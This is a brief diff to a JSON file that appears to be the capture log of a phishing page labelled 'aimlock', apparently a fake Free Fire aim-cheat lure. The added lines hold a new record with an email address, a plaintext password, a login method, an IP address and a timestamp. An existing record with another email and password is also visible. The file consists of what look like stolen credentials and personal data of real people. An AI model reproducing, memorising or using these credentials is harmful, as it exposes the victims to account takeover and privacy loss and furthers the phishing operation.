@@ -1,6 +1,14 @@
 [
   {
     "page": "aimlock",
+    "method": "Facebook",
+    "email": "rani.putri99@yahoo.com",
+    "password": "Rani#FF99",
+    "ip": "34.47.171.121",
+    "ts": 1781619275798
+  },
+  {
+    "page": "aimlock",
     "method": "Google",
     "email": "budi.santoso88@gmail.com",
     "password": "Budi@FreeFire2026",
